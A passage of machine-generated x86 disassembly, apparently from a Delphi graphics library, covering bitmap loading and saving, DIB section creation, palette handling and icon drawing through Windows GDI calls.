mov esi eax
lea edi [ edx + 0x18 ]
mov ecx 0x15
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov dl [ ebp + 0xc ]
mov [ eax + 0x70 ] dl
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ r-xdata ]
call sub_4033cc
mov edx [ ebp - 0x8 ]
mov [ edx + 0x6c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_428bbf
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_42764c
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x28 ] eax
call sub_427648
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428bc6
push rw-data
call LeaveCriticalSection
retn
sub_428bd8
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_429168
pop edx
pop edi
pop esi
pop ebx
retn
sub_428c00
push ebp
mov ebp esp
add esp 0xffffff54
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x20 ] 0xc
sete [ ebp - 0x21 ]
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax 0xc
add eax 0x400
call sub_40278c
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x3c ] eax
xor edx edx
push ebp
push sub_42911d
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push sub_4290f0
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x28
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub esi [ ebp - 0x20 ]
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
cmp eax 0x3
je r-xdata
lea edx [ ebp - 0x48 ]
add edx 0x4
mov ecx 0x8
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx [ ebp - 0x3c ]
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402c30
mov eax ebx
movzx edx [ ebp - 0x44 ]
mov [ eax + 0x4 ] edx
movzx edx [ ebp - 0x42 ]
mov [ eax + 0x8 ] edx
mov dx [ ebp - 0x40 ]
mov [ eax + 0xc ] dx
mov dx [ ebp - 0x3e ]
mov [ eax + 0xe ] dx
sub esi 0xc
jmp r-xdata
mov ebx [ ebp - 0x3c ]
mov eax [ ebp - 0x20 ]
mov [ ebx ] eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
cmp [ ebx + 0xc ] 0x1
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x28
jne r-xdata
call sub_4240a4
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ ebp - 0x38 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
cmp ax 0x10
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx 0xe
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax esi
xor edx edx
push edx
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_41c078
mov edx esi
neg edx
mov cx 0x2
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xaa ]
xor ecx ecx
mov edx 0xe
call sub_402c30
mov [ ebp - 0xaa ] 0x4d42
mov eax [ ebp - 0x20 ]
add eax esi
mov [ ebp - 0xa8 ] eax
lea eax [ ebp - 0xaa ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebx + 0x20 ]
movzx edi [ ebp - 0x21 ]
xor eax eax
mov al [ edi + rw-data ]
imul ecx eax
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_41c008
mov eax [ ebx + 0x20 ]
xor edx edx
mov dl [ edi + rw-data ]
imul edx
sub esi eax
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
call sub_424334
mov [ ebx + 0x20 ] eax
cmp [ ebx + 0x10 ] 0x3
jne r-xdata
cmp ax 0x20
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jbe r-xdata
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_424354
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov edx [ ebp - 0x1c ]
mov ecx 0xc
mov eax [ ebp - 0x8 ]
call sub_41c008
add [ ebp - 0x1c ] 0xc
sub esi 0xc
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov esi eax
push 0x0
call GetDC
call sub_4241c4
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_42906b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
call sub_4245fc
cmp [ rw-data ] 0x0
je r-xdata
cmp eax 0x3
jne r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateDIBSection
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax esi
call sub_40278c
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_428fd3
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_41c008
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleDC
call sub_4241c4
mov [ ebp - 0x10 ] eax
push 0x1
push 0x1
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleBitmap
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
test eax eax
jbe r-xdata
call GetLastError
test eax eax
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_428fa7
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x14 ]
push edx
push 0x4
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_4248b4
mov [ ebp - 0x30 ] eax
push 0x0
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
call sub_40ce50
call sub_4240a4
jmp r-xdata
xor eax eax
push ebp
push sub_42903a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_41c008
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428fae
cmp [ ebp - 0x34 ] 0x0
je r-xdata
call GetLastError
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429072
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
push eax
call DeleteObject
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
call sub_40ce50
call sub_4240a4
jmp r-xdata
sub_428fae
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_4027ac
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
sub_429072
mov eax [ ebp - 0x3c ]
cmp [ eax + 0xe ] 0x8
jbe r-xdata
lea eax [ ebp - 0x9c ]
xor ecx ecx
mov edx 0x54
call sub_402c30
lea eax [ ebp - 0x9c ]
push eax
push 0x54
mov eax [ ebp - 0x28 ]
push eax
call GetObjectA
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x60 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_429107
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x20 ] 0x0
jbe r-xdata
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
mov ecx [ eax + 0x20 ]
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_4248b4
mov [ ebp - 0x30 ] eax
sub_429124
lea eax [ ebp - 0x9c ]
push eax
mov al [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_428ad8
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_429168
push ebx
push esi
push edi
add esp 0xffffff9c
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_428868
test esi esi
jne r-xdata
mov edx esp
mov ecx 0xe
mov eax edi
call sub_41c008
cmp [ esp ] 0x4d42
je r-xdata
lea eax [ esp + 0xe ]
xor ecx ecx
mov edx 0x54
call sub_402c30
lea eax [ esp + 0xe ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
call sub_428ad8
jmp r-xdata
push esp
mov ecx esi
sub ecx 0xe
mov edx edi
mov eax ebx
call sub_428c00
call sub_4240a4
add esp 0x64
pop edi
pop esi
pop ebx
retn
sub_4291d8
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_428868
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402c30
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
push 0x54
push edi
call GetObjectA
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ esi + 0x10 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
call sub_427e80
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_429273
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_428ad8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42929c
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov ebx edx
mov esi eax
mov eax esi
call sub_428724
cmp bl al
je r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x28 ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_428868
mov eax esi
call sub_428978
push esi
push edi
lea esi [ edi + 0x18 ]
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
cmp [ edi + 0x4 ] 0x1
sete bl
test bl bl
je r-xdata
cmp eax [ edi + 0x14 ]
jne r-xdata
mov eax esi
call sub_428868
mov eax esi
call sub_428978
mov eax esi
call sub_4287f4
cmp [ edi + 0x4 ] 0x1
jne r-xdata
cmp eax [ edi + 0x8 ]
je r-xdata
mov [ edi + 0x30 ] 0x28
jmp r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
jmp r-xdata
mov eax [ edi + 0x10 ]
call sub_427e80
mov ebp eax
mov ebp [ edi + 0x10 ]
jmp r-xdata
lea eax [ edi + 0x18 ]
push eax
mov ecx [ edi + 0x10 ]
mov edx [ edi + 0x14 ]
mov eax esi
call sub_428284
jmp r-xdata
mov eax [ edi + 0x14 ]
xor edx edx
mov [ edi + 0x14 ] edx
mov ebp [ edi + 0x10 ]
xor edx edx
mov [ edi + 0x10 ] edx
lea edx [ edi + 0x18 ]
push edx
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_428ad8
jmp r-xdata
push esp
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_428ad8
mov [ edi + 0x8 ] eax
jmp r-xdata
push esp
push 0x0
mov ecx ebp
mov edx [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
call sub_42781c
test bl bl
je r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4293d4
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x20 ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_428878
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x8 ] edi
mov [ esp + 0x20 ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_428284
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_429428
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx edx
mov edi eax
mov esi [ edi + 0x28 ]
lea eax [ esi + 0x30 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0xe ] 0x1
je r-xdata
cmp bl al
je r-xdata
mov al 0x1
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_428878
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
xor eax eax
mov al bl
mov [ esp + 0x24 ] ax
mov [ esp + 0x26 ] ax
mov [ esp + 0x10 ] ax
mov [ esp + 0x12 ] ax
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax edi
call sub_428284
mov edx edi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4294a8
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp edi [ eax + 0x10 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_428868
mov eax ebx
call sub_428878
push esi
push edi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x58 ]
push eax
push 0x0
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
mov ecx edi
call sub_42781c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42953f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
mov al [ esi + 0x70 ]
push eax
push 0x0
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_428ad8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_427714
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ esi + 0x10 ]
call sub_422128
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
sub_429544
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
call sub_4039d0
call sub_403a24
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_427714
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42957c
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x1c ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_428878
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x4 ] edi
mov [ esp + 0x1c ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_428284
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4295d8
push ebx
push esi
push edi
push ebp
add esp 0xfffffbd4
mov ebx ecx
mov edi edx
mov esi eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402c30
mov [ esp + 0x10 ] 0x4d42
mov eax [ esi + 0x28 ]
mov ebp [ eax + 0x6c ]
test ebp ebp
je r-xdata
mov eax esi
call sub_4287f4
mov ebp [ esi + 0x28 ]
xor eax eax
mov [ esp ] eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx ]
mov [ esp ] eax
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx [ ebp + 0x50 ]
push edx
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
call sub_425008
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ esi + 0x28 ]
mov ebx [ eax + 0x6c ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
jmp r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_41c040
cmp [ esp ] 0x0
je r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_41c040
mov eax [ esp + 0x8 ]
add eax 0xe
add [ esp ] eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402c30
mov [ esp + 0x10 ] 0x4d42
mov eax esi
call sub_4286b8
mov dl [ r-xdata ]
call sub_423ea0
mov eax [ ebp + 0x14 ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
call sub_4241c4
mov [ esp + 0xc ] eax
lea eax [ esp + 0x2a ]
push eax
push 0x100
push 0x0
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call GetDIBColorTable
mov [ esp + 0x4 ] eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp + 0x50 ]
test eax eax
jbe r-xdata
mov [ esp + 0x8 ] 0xc
mov ax [ ebp + 0x3e ]
cmp ax 0x8
ja r-xdata
add esp 0x42c
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebp + 0x18 ]
call sub_4277d0
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x70 ] 0x0
jne r-xdata
cmp eax [ esp + 0x4 ]
jae r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
lea eax [ eax + eax * 2 ]
add [ esp + 0x8 ] eax
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ ebp + 0x50 ]
test eax eax
je r-xdata
mov eax [ esp ]
mov [ esp + 0x12 ] eax
mov eax [ esp + 0x8 ]
add eax 0xe
mov [ esp + 0x1a ] eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_41c040
lea edx [ ebp + 0x30 ]
mov ecx 0x28
mov eax edi
call sub_41c040
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
lea eax [ ebp + 0x30 ]
mov [ esp + 0x1e ] 0xc
mov dx [ eax + 0x4 ]
mov [ esp + 0x22 ] dx
mov dx [ eax + 0x8 ]
mov [ esp + 0x24 ] dx
mov [ esp + 0x26 ] 0x1
mov ax [ eax + 0xe ]
mov [ esp + 0x28 ] ax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_41c040
lea edx [ esp + 0x1e ]
mov ecx 0xc
mov eax edi
call sub_41c040
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ ebp + 0x50 ] eax
cmp eax [ esp + 0x4 ]
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp + 0x70 ]
xor ecx ecx
mov cl [ eax + rw-data ]
imul ecx [ esp + 0x4 ]
lea edx [ esp + 0x2a ]
mov eax edi
call sub_41c040
mov edx [ ebp + 0x2c ]
mov ecx [ ebp + 0x44 ]
mov eax edi
call sub_41c040
test [ ebp + 0x40 ] 0x3
je r-xdata
lea edx [ esp + 0x4 ]
lea eax [ esp + 0x2a ]
call sub_424634
cmp [ ebp + 0x70 ] 0x0
je r-xdata
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
lea edx [ ebp + 0x58 ]
mov ecx 0xc
mov eax edi
call sub_41c040
lea edx [ esp + 0x2a ]
mov ecx 0xff
mov eax [ ebp + 0x10 ]
call sub_424958
mov [ esp + 0x4 ] eax
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
mov eax [ esp + 0x4 ]
shl eax 0x2
add [ esp ] eax
add [ esp + 0x8 ] eax
sub_429890
push ebx
mov ebx eax
mov eax ebx
call sub_428878
mov edx ebx
mov eax ebx
call sub_428344
mov eax [ ebx + 0x28 ]
mov edx [ eax + 0x8 ]
mov ecx edx
cmp edx [ eax + 0x14 ]
jne r-xdata
xor edx edx
mov [ eax + 0x8 ] edx
mov eax ecx
pop ebx
retn
xor edx edx
mov [ eax + 0x14 ] edx
xor edx edx
mov [ eax + 0x2c ] edx
sub_4298c4
push ebx
mov ebx eax
mov eax ebx
call sub_428878
mov edx ebx
mov eax ebx
call sub_428344
mov eax [ ebx + 0x28 ]
mov edx [ eax + 0x10 ]
xor ecx ecx
mov [ eax + 0x10 ] ecx
mov eax edx
pop ebx
retn
sub_4298f0
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov [ edx ] 0x2
mov eax ebx
call sub_428878
mov esi [ ebx + 0x28 ]
push esi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov edi [ esi + 0x10 ]
mov ecx edi
mov edx edi
mov eax [ esi + 0x8 ]
call sub_42781c
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
xor eax eax
push ebp
push sub_42996a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
call sub_427e80
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_429990
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_40321c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40320c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_4299d8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_425344
mov [ edi + 0x21 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_427648
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_429a2c
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_42764c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a714
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_429a5c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
xor ecx ecx
xor edx edx
mov eax esi
call sub_429d34
mov edi ebx
mov eax [ edi + 0x28 ]
call sub_427648
mov eax [ esi + 0x28 ]
call sub_42764c
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_41a740
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
sub_429abc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax esi
call sub_423ea0
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_429b14
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ esi + 0x4 ]
push eax
call DrawIconEx
pop edi
pop esi
pop ebx
retn
sub_429b50
push ebx
push esi
add esp 0xfffffff4
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x0
call sub_41bdfc
mov edx esp
mov ecx 0x6
mov eax [ ebx + 0xc ]
call sub_41c008
mov ax [ esp + 0x2 ]
sub ax 0x1
jb r-xdata
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
jmp r-xdata
je r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
push 0x6
lea eax [ esi + 0x2c ]
push eax
lea eax [ ebx + 0x10 ]
push eax
movzx ecx [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
mov eax [ ebx + 0xc ]
call sub_424c04
jmp r-xdata
jmp r-xdata
call sub_4240b0
sub_429bc8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0xc ] 0x0
